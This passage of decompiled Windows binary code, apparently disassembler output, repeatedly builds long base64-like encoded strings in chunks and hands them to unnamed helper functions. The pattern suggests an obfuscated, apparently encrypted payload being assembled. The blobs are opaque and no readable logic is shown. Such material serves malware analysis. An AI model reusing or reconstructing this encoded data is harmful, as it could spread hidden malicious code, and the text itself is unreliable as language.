\"cx/HHFyjh2thOBsHi9muwJxv3bhTB2+tYuZpJw3Mw09KRyImM9tlyI8bpx3F3nZXLcxrd3fsAsgsJ72ITlPnwfcRHD/x2KNPW8vp/m4/Fchz50/WZ4m6dzDo41MbIWgKTCPd+F9Xp5PjLapPDVRLH3euU9L6a538H+MfGBAWPHch/KNvV9GDiUDfNbhzH8fMiBUBa2FAGweLpZtXnG/d8FMHbyZcYfcnDYTDT0pQj/Ao22WQjxunX9jVIFctlGt3d22mnvgnvcBOU+dA6PwKP/GQo09bZV9zDj8V8HPnTz3GkWl3MNDjUxszYkNZI90wX1enMNGqVU8NnEsfd9syIkRrnSQf4x+kSD6tdyEko29XYtukzd81cHMfx1V6D1VrYYgbB4sEzgumb90IUwdviVqHjScNfMNPSsyap6nbZViPG6f26AY5Vy1ca3d30e6DqSe9GE5T51DRusw/8UijT1tbXrr5PxU4c+dPwvmkQncwGONTG1aH5/Uj3QhfV6e20njDTw2kSx93iYa0gWudbB/jH8Qif293IWyjb1cQjM7k3zUocx/Hk221R2th0BsHi+k+H4Jv3UBTB2+PzXJTJw00w09Kb5ZUJ9tlII8bp3CkKhtXLSRrd3dWgqaCJ71QTlPnU9db3T/xAKNPW8tfxcc/FWBz509Pn0BDdzBA41MbPNWxZCPdQF9Xp9DOrTZPDexLH3elAeXda51UH+MfNItCuXchVKNvV6jjxoTfNeB0H8eYpnJWa2EYHAeLqa4dDG/dmFQHb5eYEZsnDezET0ocQgMY22Xo\"\n    ;\n    puStack672 = &stack0xfffffd7c;\n    puStack676 = &stack0xfffffd98;\n    pcStack680 = 0x406984;\n    puStack676 = fcn.00401091();\n    pcStack668 = 0xffffffff;\n    puStack672 = NULL;\n    pcStack680 = 0x406994;\n    fcn.004011db();\n    if (0xf < puStack604) {\n        pcStack680 = puStack624;\n        puStack684 = 0x4069a4;\n        fcn.0040b0dd();\n    }\n    pcStack680 = \n    \"iBunjDe9gVct7Gx3d65SQF8nvahJU+cRqKveP/H4pE9bLL3YAz8VqHTnT7v1JHR3MIjkUxv0uwvjI92YWFenoW2yzU8NNEwfd/JCOHlrnZwY4x9adVfbdyGcpG9X8DDBJd812HQfx5Qv5tVrYSAcB4t1CVi1b93QVAdvpSmDyCcNpMRPSpcCbzzbZbCIG6fu/FMSVy20bHd3ShSspye94ElT56m+fUo/8bCkT1t+Me1nPxXQdOdPGL1DQHcw8ORTG5fzmWMj3dBYV6cznZA4Tw18TB93V5F3l2udxBjjH1kJePh3IcSkb1e+T+lu3zWQdB/HOtrhSGthaBwHi+gHMrBv3ehUB2/a3pzwJw2cxE9K3kFL3dtleIgbp7U3dJJXLXxsd3dpNW44J704SVPnE9Pwdj/xaKRPW/IBSXQ/FRh050/nc0LpdzA45FMbqcrfAiPdKFhXp6OClYRPDYRMH3cX79QZa50MGOMfU6mvL3chDKRvV/g+rrnfNUh0H8dIuS4Ia2GwHAeLKuDX3G/dIFQHb6cHGMUnDVTET0q4unLR22VAiBuniLdO11ctRGx3dykrW/InvXBJU+c8pBQGP/EgpE9bsAlkRz8VQHTnTzUJL7J3MGDkUxthK4pYI91gWFenjLK2vE8NzEwfdzVAvyprnXQY4x9WzxiZdyF0pG9XEJmC7981AHQfx1TynnNrYfgcB4tZOZHRb914VAdvzuDocycNDMRPSkWxRO7bZQiIG6eINX3eVy0MbHd3M39a5ie9SElT5y5iJrA/8RikT1uo7ASyPxWI\"\n    ;\n    puStack684 = &stack0xfffffd70;\n    puStack688 = &stack0xfffffd8c;\n    pcStack692 = 0x4069bb;\n    puStack688 = fcn.00401091();\n    pcStack680 = 0xffffffff;\n    puStack684 = NULL;\n    pcStack692 = 0x4069cb;\n    fcn.004011db();\n    if (0xf < puStack616) {\n        pcStack692 = puStack636;\n        puStack696 = 0x4069db;\n        fcn.0040b0dd();\n    }\n    pcStack692 = \n    \"dedPyO+5MncwqOVTGyKdqgYj3bhZV6fg1h1cTw0UTR93vxvVXWudvBnjH7OjnZN3Ibylb1cC/67m3zX4dR/HQLPv/WthAB0Hi6j1syVv3bBVB2/y5BvpJw3ExU9Kgno9x9tl0Ikbp6vaa19XLdRtd3ftGqshJ72ASFPn/VmaiD/x0KVPW3WmjOQ/FbB1509/F49vdzCQ5VMbSFL37CPd8FlXp3PchvZPDVxNH3e6x9iIa53kGeMfaEEfk3ch5KVvV0wkfonfNbB1H8eWlvK2a2FIHQeL5eFa22/dyFUHb8P4xV4nDbzFT0rgfbQh22WYiRunkpyD7VctnG13dySspXsnvdhIU+caBXxqP/GIpU9bI7X3HT8V+HXnT328Z3F3MNjlUxuz/k79I93IWVenevZey08NZE0fd42BHYdrnSwZ4x+2I6vRdyEspW9X1vyjeN81aHUfx3hV691rYZAdB4vENtR7b90AVQdvtIm4/CcNdMVPSmbq/7zbZWCJG6dLZ4wiVy1kbXd3dJ3ANye9EEhT58BEiZ4/8UClT1t3VgqxPxUgdedP84ce93cwAOVTG/Cw8XUj3QBZV6d5I2B5Tw2sTR93VJTx2GudFBnjHwZ3Kj13IRSlb1dsqDpF3zUgdR/H/5myGGth2B0Hi7/Xeklv3VhVB289wO16Jw0sxU9K8hXPK9tlKIkbpwsYTBlXLSxtd3cx4UwIJ71oSFPnUyb7uj/xOKVPW51n0iU/FWh150+uXiqKdzBI5VMbZaeAICPdWFlXp4xK3EdPDfRNH3cf4Pt4a51c\"\n    ;\n    puStack696 = &stack0xfffffd64;\n    puStack700 = &stack0xfffffd80;\n    pcStack704 = 0x4069f2;\n    puStack700 = fcn.00401091();\n    pcStack692 = 0xffffffff;\n    puStack696 = NULL;\n    pcStack704 = 0x406a02;\n    fcn.004011db();\n    if (0xf < puStack628) {\n        pcStack704 = puStack648;\n        puStack708 = 0x406a12;\n        fcn.0040b0dd();\n    }\n    pcStack704 = \n    \"GeMfhneYPHchXKVvV6SoMFffNRh1H8f3xcwqa2HgHQeL5AL25m/dkFYHbyq2gjQnDeTGT0qKUqm/22Xwihunebc3w1ct9G53d551850nvaBLU+cySOVMP/Hwpk9bkuIkIz8VkHbnT8dMQKJ3MLDmUxuv5pX2I92QWlenmTpR1k8NPE4fd6AHW6xrnYQa4x+jIlE1dyGEpm9X7hEyBN810HYfx4ObI+5rYSgeB4uvtEKXb92oVgdv4bELyicN3MZPStOEJiPbZbiKG6dLTcWrVy28bnd3MRHI6Se9+EtT5xnfnbI/8aimT1vHvvS1PxXYdudP5QazN3cw+OZTG6WMoPkj3ehaV6ftpUvyTw1ETh9335+9tGudzBrjH0t/zLV3Icymb1f18tbb3zWIdh/H1uPKNmthcB4Hi61mYftv3eBWB29xN+jbJw2Uxk9KgLOe3dtlgIobpzXcC8tXLYRud3dUjJOJJ70wS1PnNGo17T/xYKZPWxlbRCk/FQB2508T3AM6dzAg5lMbOOmpeCPdIFpXp1JBOddPDYxOH3dyDWK5a500GuMfWaPB9HchNKZvVz1RNjTfNUB2H8cE2Xjia2G4HgeLAuyZrG/dOFYHbxAw5S8nDUzGT0rJ32/c22VIihunDL0SVFctTG53dxZMPcEnvQhLU+fFwhavP/FYpk9bhc5e+j8VSHbnT0d1eiN3MGjmUxtqr/quI914Wlen32YXw08N1E4fd4tVRP1rnXwa4x8RLaU1dyF8pm9X96SDOd81OHYfxx6ANhVrYcAeB4tbLOzkb91w\"\n    ;\n    puStack708 = &stack0xfffffd58;\n    puStack712 = &stack0xfffffd74;\n    pcStack716 = 0x406a29;\n    puStack712 = fcn.00401091();\n    pcStack704 = 0xffffffff;\n    puStack708 = NULL;\n    pcStack716 = 0x406a39;\n    fcn.004011db();\n    if (0xf < puStack640) {\n        pcStack716 = puStack660;\n        puStack720 = 0x406a49;\n        fcn.0040b0dd();\n    }\n    pcStack716 = \n    \"VgdvJA6pZScNBMZPSuxcSRbbZRCKG6dTzVTgVy0Ubnd3tJTb1ye9QEtT52mDDJ0/8RCmT1v2Lig6PxVwdudPSW3gFHcwUOZTG/h11Ssj3bBbV6dhdQfvTw0cTx93TDMEUmudpBvjH/EQGKt3IaSnb1c5DC6C3zXwdx/HATiNp2thCB8Hi51wq4Fv3YhXB293RbA4Jw38x09K00hth9tl2IsbpygaHaBXLdxvd3f9fiffJ72YSlPnKSaO7D/xyKdPWykyrbA/Fbh350+YycdsdzCY51MbvOZsQiPdiFtXpxPM0bRPDSRPH3fuu0sYa53sG+Mf9MaLNXch7KdvV+TRiHPfNah3H8fqhpHHa2FQHweL5y2X4m/dwFcHbyLEY9gnDbTHT0pCzVrd22WgixunBIFi3VctpG93d/MFotAnvdBKU+dwG57bP/GAp09b2w8CtD8V4HfnT4UQWVh3MMDnUxscsQeSI93AW1enZd068U8NbE8fdxCTrwBrndQb4x9H2hdbdyHUp29X0ZuP1N/1YJJpdRFy6ZwQJeUsPzFsiujJ9J/VJGVh4lrf9XD5l9uxcumMndan4T8xfDkcpxWf1TR8ttpM3/VAmOBMPXLpvNAcbpc/MUzM1L8+n9UEyh/5Bd/1UHszz9ty6ayOJSufQq+e9aZj7eCZWgPhMYj78OBPpYTQd/3Za6HcJcmUL5/1YGpyUHo/1UB4rE9QT6X0wOHczWuhzHZAiN2f9XA6DbLTP9VQ0JdWmU+l5DPaJdBrofzDnfldn/VAJmE+oT/VYAueYwlPpdQl\"\n    ;\n    puStack720 = &stack0xfffffd4c;\n    puStack724 = &stack0xfffffd68;\n    pcStack728 = 0x406a60;\n    puStack724 = fcn.00401091();\n    pcStack716 = 0xffffffff;\n    puStack720 = NULL;\n    pcStack728 = 0x406a70;\n    fcn.004011db();\n    if (0xf < puStack652) {\n        pcStack728 = puStack672;\n        puStack732 = 0x406a80;\n        fcn.0040b0dd();\n    }\n    pcStack728 = \n    \"3enpa6HskRo+Xp/1UOzM1xU/1XBV/drET6XEIZjd+UQ5iB8H/xQOT7EkpdCoc14r5Anx4GCfrU9KJxXA9V3gdeHAoE9bwJhv6Pj46Vqg4Ih/4TiwXfmVUxufJPQqb73tZ/3TfCkUtIyIGOYnDTzDT0rFxaD+22UYjxunWmeRaFctHGt3dxwOgUsnvVhOU+dxxqNOP/EIo09bpE5N5D8VeHPnT70VZmt3MFjjUxvIvfwQI91IX1eneOSeak8N5Esfd20cM75rnawY4x/s8Qa4dyGspG9XRWacfN816HQfx2meC+RrYRAcB4u6JHqkb92AVAdvXZn8ZycN9MRPSvfBNPXbZeCIG6fdb4IpVy3kbHd3G+WjJSe9kElT50hSBmI/8cCkT1ubaP+LPxWgdOdPMNXhy3cwgORTGzMP9TEj3YBYV6erTQcHTw0sTB933ZDCcmudlBjjH606bpR3IZSkb1eFYy1c3zWgdB/HJJPSZWthWBwHizPDY2Fv3dhUB2+iNQq5Jw2sxE9Kza9BIdtlqIgbp2lZjMVXLaxsd3dhDthNJ73oSVPnXvqu2T/xuKRPWz8OhEo/Feh050/ZxoBndzDI5FMbS12A+iPd2FhXp71mmdlPDXRMH3cJVyjGa53cGOMfFn7Kmnch3KRvVwilTDvfNZh0H8eDqYGHa2FgHAeLNghgTW/dEFQHb2ILUPMnDWTET0o014fg22VwiBunszHnQlctdGx3d7ZoYu8nvSBJU+dpBk4GP/FwpE9bVfn53T8VEHTnT3MD9uB3MDDkUxu6UVLAI90Q\"\n    ;\n    puStack732 = &stack0xfffffd40;\n    puStack736 = &stack0xfffffd5c;\n    pcStack740 = 0x406a97;\n    puStack736 = fcn.00401091();\n    pcStack728 = 0xffffffff;\n    puStack732 = NULL;\n    pcStack740 = 0x406aa7;\n    fcn.004011db();\n    if (0xf < puStack664) {\n        pcStack740 = puStack684;\n        puStack744 = 0x406ab7;\n        fcn.0040b0dd();\n    }\n    pcStack740 = \n    \"WFenTSpChk8NvEwfd6IzF9hrnQQY4x88btv2dyEEpG9XUufJXt81UHQfx/tIdfprYagcB4t17kCab90oVAdvcxHM5ycNXMRPSiLjpCrbZTiIG6cNQq8nVy08bHd3gCZUVSe9eElT5792jB8/8SikT1tWpEZcPxVYdOdPbXCbfHcweORTG6wv6cEj3WhYV6cavumTTw3ETB93oKjHQGudTBjjH8PaFbJ3IUykb1c2+AoV3zUIdB/HP1DMP2th8BwHi2EwMyNv3WBUB28wV8EWJw0UxE9KWNNHX9tlAIgbp1FG9jdXLQRsd3cRFToUJ72wSFPntSrQ6z/x4KVPW/HnBkU/FYB150+D6+U8dzCg5VMb8d7QdyPdoFlXp50qazxPDQxNH3cinPxqa520GeMfXJTJuHchtKVvV87jrFrfNcB1H8d/MM13a2E4HQeLyUMdjm/duFUHbxbVRQcnDczFT0ornl7M22XIiRuntcE931ctzG13d5aWEOYnvYhIU+cKDNmlP/HYpU9bUp0SOT8VyHXnT0wwESt3MOjlUxuGU8W1I934WVeneGPTcE8NVE0fd3czNGtrnfwZ4x8UZBC8dyH8pW9Xrf50vt81uHUfx81R5eNrYUAdB4tu2O+Yb93wVQdvxGnq0CcNhMVPSnNhTXfbZZCJG6f35NlvVy2UbXd3y3cNcye9wEhT5/bJyro/8ZClT1sWmOdCPxXwdedP82/sOHcw0OVTG1JIImkj3TBZV6eITIxPTw2cTR931V40aGudJBnjH6f80mh3ISSlb1f0wO1z3zVw\"\n    ;\n    puStack744 = &stack0xfffffd34;\n    puStack748 = &stack0xfffffd50;\n    pcStack752 = 0x406ace;\n    puStack748 = fcn.00401091();\n    pcStack740 = 0xffffffff;\n    puStack744 = NULL;\n    pcStack752 = 0x406ade;\n    fcn.004011db();\n    if (0xf < puStack676) {\n        pcStack752 = puStack696;\n        puStack756 = 0x406aee;\n        fcn.0040b0dd();\n    }\n    pcStack752 = \n    \"dR/HRl2BG2thiB0Hi6dfSrpv3QhVB2+9J3W5Jw18xU9KldBEVdtlWIkbp2/6j8dXLVxtd3cEe6j7J70YSFPn+quArD/xSKVPW398kLs/FTh1508Y9LkbdzAY5VMbDDQzgyPdCFlXp8pVsXBPDaRNH3cf9Rcoa51sGeMfhdklMXchbKVvV0EmYezfNSh1H8ctKhO4a2HQHQeLgGUrs2/dQFUHb+CPTd4nDTTFT0qS4VOK22UgiRunnCI1PVctJG13d/gyhLonvVBIU+fJWoLuP/EApU9bP6UTST8VYHXnTyu+sRV3MEDlUxt836DlI91AWVenzVDeMU8N7E0fd4COyh5rnVQZ4x/Gfz0KdyFUpW9XdrKepN814HYfxzFrt3hrYRgeB4uUloQJb92YVgdv9zCcTycN7MZPSsuGl4bbZeiKG6ejqJ4EVy3sbnd3dzzFlSe9qEtT552g/6w/8fimT1v7ZigtPxWodudPL7rqQ3cwiOZTG9d9Fg4j3ZhaV6d+XQzVTw00Th93DnbeemudnBrjH/NIuQ93IZymb1dPVbfy3zXYdh/HSHC5FWthIB4HiwvNUVZv3dBWB29zKquTJw2kxk9KvzVFD9tlsIobp/KjzchXLbRud3e6qlCsJ73gS1Pn4HAIFz/xsKZPW+mFqGg/FdB2508gW2xsdzDw5lMbWqV/yyPd0FpXpzdNVtFPDXxOH3ee3tqHa53EGuMfNZvpPXchxKZvV8vTXHPfNZB2H8eI71Ula2FoHgeL61m7/G/d6FYHb4b2vIgnDZzGT0puTdmV22V4\"\n    ;\n    puStack756 = &stack0xfffffd28;\n    puStack760 = &stack0xfffffd44;\n    pcStack764 = 0x406b05;\n    puStack760 = fcn.00401091();\n    pcStack752 = 0xffffffff;\n    puStack756 = NULL;\n    pcStack764 = 0x406b15;\n    fcn.004011db();\n    if (0xf < puStack688) {\n        pcStack764 = puStack708;\n        puStack768 = 0x406b25;\n        fcn.0040b0dd();\n    }\n    pcStack764 = \n    \"ihunI5dU3lctfG53d0v6WcsnvThLU+ejR0MhP/Fopk9bi3VzWT8VGHbnT5NBbZF3MDjmUxsnZrapI90oWlenICU+tk8NhE4fdzOv+kZrnQwa4x8lkZ7WdyEMpm9XhNko2d81SHYfx1IF8dVrYbAeB4tpfPDzb90gVgdvh1lowScNVMZPSqwUwibbZUCKG6caYpziVy1Ebnd3PiguMye9cEtT57AvFrU/8SCmT1vAZLvmPxVAdudPKtYVPXcwYOZTGz3UeEsj3WBaV6e3bQ09Tw3MTh93p7bmGGuddBrjH7YKO+F3IXSmb1clSduK3zUAdh/H6T8mQWth+B4Hi9iTZ9Fv3XhWB29vz3m9Jw0Mxk9K0EUIYNtlCIobpwnI1l1XLQxud3fkt7zWJ71IS1Pn8+akSz/xGKZPW+wCdXs/FYh350/1heoRdzCo51Mbjbd6pCPduFtXp940trNPDRRPH3d0Mdpxa528G+Mfr8f/W3chvKdvV+Qaf9/fNfh3H8dWeTpqa2EAHweL0GT+NG/dsFcHb2MnbwAnDcTHT0oITt8V22XQixunJ789U1ct1G93d2rFawYnvYBKU+el8ieiP/HQp09bXlc45T8VsHfnT58mMFF3MJDnUxuIHu/yI93wW1enLnvbH08NXE8fd+2X+8trneQb4x8JGC3tdyHkp29XF0EYx981sHcfx1DlgLFrYUgfB4so7dccb93IVwdvoOZHfycNvMdPSpSpMpHbZZiLG6duGm6zVy2cb3d3b59ipie92EpT592b4Ko/8YinT1s0jPByPxX4\"\n    ;\n    puStack768 = &stack0xfffffd1c;\n    puStack772 = &stack0xfffffd38;\n    pcStack776 = 0x406b3c;\n    puStack772 = fcn.00401091();\n    pcStack764 = 0xffffffff;\n    puStack768 = NULL;\n    pcStack776 = 0x406b4c;\n    fcn.004011db();\n    if (0xf < puStack700) {\n        pcStack776 = puStack720;\n        puStack780 = 0x406b5c;\n        fcn.0040b0dd();\n    }\n    pcStack776 = \n    \"d+dP3+o33Hcw2OdTG8CtwIsj3chbV6ca4kEiTw1kTx93/+Pr4mtdLCVwEUCzodynIht5V+1w9c61wHelBC3m5xdrXTxzv7Ufs6HMsRRKR1ftYKrJQjd3pRSdPbeBa10MF48BQs4/Ih2ybx00D+lyFjG4V6CIJ30YhH0bKiNZTJkztK534RizfRjxV808AEqBNid9CDHH9Z8jWVz4wVedd+Foj8nBkVfNTBC8ShEnfXiXU59MI1ksrgx4x3fheL1zENJXzVwgq9p/J31oihivrCNZPP1J7it34UgwrBcaV81sROmtLSd9WGoP854jWQyM2WcMd+FY9pb3i1fNfHDjWSknfUjKvy4jI1kcjPQfF1gpIqdvIwjGd52UTaCIa/YTxb1ZrAwzaweLb1XAtelYHT0ka3d3cLAVyOBQrXs9BsTtHeD4nOHbT1srnJz2c3XVS007DAkMjLO1rE5rYVAcB4uq3HxVb93AVAdvLVXhfScNtMRPSppk5lvbZaCIG6elQGKpVy2kbHd3cXdq8Se90ElT5+w/VzQ/8YCkT1uNHBnYPxXgdOdPExLX6HcwwORTG4/P/04j3cBYV6dp/iB6Tw1sTB93invrx2ud1BjjH5XKQdd3IdSkb1drjLUl3zVgdB/HThhommthmBwHi9qAwrVv3RhUB2/NiO+PJw1sxE9K9rE8qNtlaIgbp3tMbBhXLWxsd3fT9nl1J70oSVPnxBy1oz/xeKRPW54YnJo/FSh050/Fdq0DdzAI5FMbMdQKtiPdGFhXp1w3QydPDbRMH3daQn+Ka50c\"\n    ;\n    puStack780 = &stack0xfffffd10;\n    puStack784 = &stack0xfffffd2c;\n    pcStack788 = 0x406b73;\n    puStack784 = fcn.00401091();\n    pcStack776 = 0xffffffff;\n    puStack780 = NULL;\n    pcStack788 = 0x406b83;\n    fcn.004011db();\n    if (0xf < puStack712) {\n        pcStack788 = puStack732;\n        puStack792 = 0x406b93;\n        fcn.0040b0dd();\n    }\n    pcStack788 = \n    \"GOMf7op+SXchHKRvV2NLo8zfNVh0H8cP83npa2GgHAeLiV8mc2/dUFQHbxvijUEnDSTET0rrXNmi22UwiBunggmbjVctNGx3dwqcjRAnvWBJU+cJ1F1OP/EwpE9bk3yR4j8VUHTnTyfH3513MHDkUxsFp/dAI91QWFenRRAJ+U8N/Ewfd7qHEqprnUQY4x8OpZ9TdyFEpG9X5lHUGd81EHQfx7UnINNrYegcB4vlgepub91oVAdvrB72CicNHMRPSg1q/XLbZfiJG6dDeGLhVy38bXd3wVreMSe9uEhT580qrCU/8eilT1tGClKQPxWYdedPGYvSWncwuOVTG7+duYoj3ahZV6cRKcnfTw0ETR93ae28a2udjBnjHz1lVjp3IYylb1e8FOjX3zXIdR/HVGkd7WthMB0Hi2HOEC5v3aBVB29ryEgnJw3UxU9K8gvhkNtlwIkbp+zOLIlXLcRtd3darF3PJ73wSFPnf5vAID/xoKVPWz5+5zY/FcB150/2DXmgdzDg5VMbbZErLiPd4FlXpygrJv5PDUxNH3dgX5oca530GeMftFT/oHch9KVvVzsbvOzfNYB1H8fZ3i7Ta2F4HQeL/NQq1W/d+FUHb/JCYBknDYzFT0pMoo6d22WIiRunibn6wVctjG13dwymDzInvchIU+cSqQYzP/GYpU9b9GKLYD8VCHXnT91mpUV3MCjlUxtBuADuI904WVenDlIk1k8NlE0fd9xbyj9rnTwZ4x8o1YTGdyE8pW9XAyGgO981eHUfx8euJ81rYYAdB4siHJI6b90w\"\n    ;\n    puStack792 = &stack0xfffffd04;\n    puStack796 = &stack0xfffffd20;\n    pcStack800 = 0x406baa;\n    puStack796 = fcn.00401091();\n    pcStack788 = 0xffffffff;\n    puStack792 = NULL;\n    pcStack800 = 0x406bba;\n    fcn.004011db();\n    if (0xf < puStack724) {\n        pcStack800 = puStack744;\n        puStack804 = 0x406bca;\n        fcn.0040b0dd();\n    }\n    pcStack800 = \n    \"VQdvnsKA6ScNRMVPSmpJ8F3bZVCJG6fwgmMiVy1UbXd3DiBEhSe9AEhT5wA95lw/8VClT1twCI67PxUwdedPzY0rQncwEOVTG/qLtQUj3XBZV6fXbNd0Tw3cTR93ddcUtGudZBnjH8qx3RJ3IWSlb1dhcO1T3zUwdR/HY4GiTWthyB0Hi5TCxu9v3UhVB2/8uACEJw08xU9KFxZ0Z9tlGIkbp2yIHyhXLRxtd3dQEVM2J71YSFPn5dxWmD/xCKVPWw8uc9M/FXh150+6Ag8PdzBY5VMb+LHH0yPdSFlXp06nRnZPDeRNH3eJ1y1Ya52sGuMfi81auXchrKZvV9GjCNzfNeh2H8fSmNqGa2EQHgeL8iRxVG/dgFYHbxw5PDsnDfTGT0qjN46V22XgihunbKLs/Vct5G53d2kS0QonvZBLU+coUBruP/HApk9bX35Qjj8VoHbnTy9jI0J3MIDmUxsIokMHI92AWlenR3UPg08NLE4fdzXi6UlrnZQa4x+n29JEdyGUpm9XCywpEt81oHYfx9fMsmhrYVgeB4tWKYObb93YVgdvZI0soCcNrMZPSjJgFmPbZaiKG6eCkO/pVy2sbnd3nJlrNSe96EtT55knBsY/8bimT1vQ9GFsPxXodudPfFPI/3cwyOZTG6aQ7S8j3dhaV6dcJ9Y4Tw10Th939xPs2mud3BrjH6aTy/d3Idymb1eEl/7K3zWYdh/H23C8q2thYB4Hi2MyiClv3RBWB2+Als91Jw1kxk9KSA7Eg9tlcIobpzPGhXZXLXRud3eRcFZMJ70g\"\n    ;\n    puStack804 = &stack0xfffffcf8;\n    puStack808 = &stack0xfffffd14;\n    pcStack812 = 0x406be1;\n    puStack808 = fcn.00401091();\n    pcStack800 = 0xffffffff;\n    puStack804 = NULL;\n    pcStack812 = 0x406bf1;\n    fcn.004011db();\n    if (0xf < puStack736) {\n        pcStack812 = puStack756;\n        puStack816 = 0x406c01;\n        fcn.0040b0dd();\n    }\n    pcStack812 = \n    \"S1PnQSzy1z/xcKZPW1PU/CM/FRB2508IOi8tdzAw5lMbQIwKYSPdEFpXp9UqvyFPDbxOH3cFViD5a50EGuMf5PtjdXchBKZvV0on3t7fNVB2H8fMlGjpa2GoHgeLOMx+wG/dKFYHb95IIB0nDVzGT0q3EuM222U4ihun7LLMC1ctPG53d1pumosnvXhLU+fPwrbsP/Eopk9btHNYa0JL8iUOd2VYHsdP9hJE1F2MCbh0I91kWlenEMoe3U8NwE4fdxXUBbFrnXAa4x9gKrIndyFIpm9XEuLzEN81BHYfx2k+RqJrYfQeB4tl0vtgb918VgdvK+MrjycNEMZPSth9yWHbZQyKG6dP2jkVVy0Abnd3rTyBGye9TEtT5xY55e4/8eSnT1tBaWrMPxWMd+dPevAxlXcwpOdTG/+WUfEj3bxbV6fGKn8bTw0ITx93zpmD3muduBvjHyF8Och3IbCnb1cPs43F3zX8dx/HKMb/KWthPB8Hi987/8Bv3bRXB2/RtZvXJw3Ix09KvuKzaNtl1Isbp3VkbXZXLchvd3cNLaVtJ72ESlPnj2+Yfz/x3KdPW1l03rg/FbR350+/KuB9dzDs51MbG5v37yPd9FtXp1NGKWxPDVBPH3czJWQqa53gG+MfaLKcrHch+KdvVy43odrfNbR3H8c1Il/Da2FEHweLPECwJ2/dzFcHb9RdQKonDYDHT0rKDitG22Wcixun/sPWPVctkG93d5A6WSUnvdxKU+fjApZgP/GUp09bWlv54z8V/HfnTxcpXG13MNTnUxub81H3I93M\"\n    ;\n    puStack816 = &stack0xfffffcec;\n    puStack820 = &stack0xfffffd08;\n    pcStack824 = 0x406c18;\n    puStack820 = fcn.00401091();\n    pcStack812 = 0xffffffff;\n    puStack816 = NULL;\n    pcStack824 = 0x406c28;\n    fcn.004011db();\n    if (0xf < puStack748) {\n        pcStack824 = puStack768;\n        puStack828 = 0x406c38;\n        fcn.0040b0dd();\n    }\n    pcStack824 = \n    \"W1enOSm8f0/NmG8yyW7/9TGgjxmB26VwhdDHlmPt1Hg8AKZPzYgzw1lw//UhriB/w9ulYEdG1+xj7cTpfuUxT824ghHNqP/1EbXB6L7bpVARF5JQY+30BJzzL0/NqMM0jGb/9QGX2zIL26VAjz/zBmPt5JJMbN1PzdhOmAWE//VxXBmV0NulME6VI6dj7ZQH9EfPT83IhIHEPf/1YV2Y4VLbpSCcQPadY+2Envjixk/N+PCrS1//9VHQ42G526UQI5x6IGPttIoDMYhPzeilzMTR//VBk1p+Y9ulAPrXRrRj7aSd4cNkYN2ZTx8DEG5PoCDl7OSXLlsA9RmwTF/Zb1dznfyZWbBtHazET0rEuKulHIi3iUcP2EmoWJBANel3d5t07NZr3e12+ZNAZ/C0rs4/Ih2ybx08zFy2UTF4U6CIJ30AjpKF9iNZVMfvMLd34RBfTAsEV8007JQ1Kyd9cCHjI9YjWSTae2LZd+FgUecm21fNRHzj5LknfWDMZ8yFI1k0R00zonfhcPso6tZXzVSoyKkAJ31QtzVEYCNZBH1Al8B34UAuMJVWV81k7lye3yd9QD6yweIjWRSuKQoWd+FQtenCsFfNdJRPWloIVzBKU5NcsuP1dImkWDtqCyCB6fh4mQnnT2uFmCnxtSFNAIx867l0jNgTapgyhUAV6Hd3m3Ts1mvd7Xb5k0Bl8CD6dOQOdyHopW9XEESVS981pHUfx48/7MtrYVQdB4tWosq8b93cVQdvgJZXKicNsMVPSt/sTQHbZayJG6eFwwEeVy2gbXd3+alh\"\n    ;\n    puStack828 = &stack0xfffffce0;\n    puStack832 = &stack0xfffffcfc;\n    pcStack836 = 0x406c4f;\n    puStack832 = fcn.00401091();\n    pcStack824 = 0xffffffff;\n    puStack828 = NULL;\n    pcStack836 = 0x406c5f;\n    fcn.004011db();\n    if (0xf < puStack760) {\n        pcStack836 = puStack780;\n        puStack840 = 0x406c6f;\n        fcn.0040b0dd();\n    }\n    pcStack836 = \n    \"Qye97EhT57BsFDA/8YSlT1snCicFPxXsdedPuKxco3cwxOVTG/eJ4Xcj3dxZV6ddAGWMTw1oTR934u/lDmud2BnjH1DZLA93IdClb1fq8z1e3zWcdR/HvA3XfmthnB0HiyECzZNv3RRVB28iTXY8Jw1oxU9Kq0tJ89tldIkbpwRu4A9XLWhtd3cw1yf3J70kSFPnqPsN3z/xfKVPW4xBBMU/FRR150+PMs4pdzAM5VMb0mHqISPdFFlXp+D3XFdPDbBNH3fTqkH6a50AGeMf75KtT3chGKVvV71D2H3fNVR1H8d21pz1a2GkHQeLLPkXV2/dLFUHby6dAvgnDSDFT0o693Lj22U8iRunCMVNZ1ctMG13dxnGCcMnvXxIU+c+TWOoP/E0pU9bZvw/Az8VXHXnT9aZ0kl3MHTlUxsiTSO3I91sWVenyC6P8k8N+E0fd+ieXPZrnUgZ4x8gKDOpdyFApW9XXzowRt81DHUfx8GWm7lrYewdB4u9UZ2cb91kVQdvTGt4CycNGMVPSqwckarbZQSJG6cprR5iVy34bnd3F/djYie9tEtT57D9ykU/8eymT1vV57X6PxWEdudP+Hh3nHcwvOZTG+qg1vYj3aRaV6ey8VXPTw0ATh93sgouA2udsBrjHwJCIzB3IYimb1c4gQ1b3zXEdh/H8b83oWthNB4Hi0RZ/itv3bxWB2+2EWvjJw3Qxk9K9fj9QNtlzIobp2asL/ZXLcBud3cVtZdrJ72MS1Pn8j3vKz/xpKZPW3zDE6c/Fcx2509AhxBTdzDk5lMbyqg8\"\n    ;\n    puStack840 = &stack0xfffffcd4;\n    puStack844 = &stack0xfffffcf0;\n    pcStack848 = 0x406c86;\n    puStack844 = fcn.00401091();\n    pcStack836 = 0xffffffff;\n    puStack840 = NULL;\n    pcStack848 = 0x406c96;\n    fcn.004011db();\n    if (0xf < puStack772) {\n        pcStack848 = puStack792;\n        puStack852 = 0x406ca6;\n        fcn.0040b0dd();\n    }\n    pcStack848 = \n    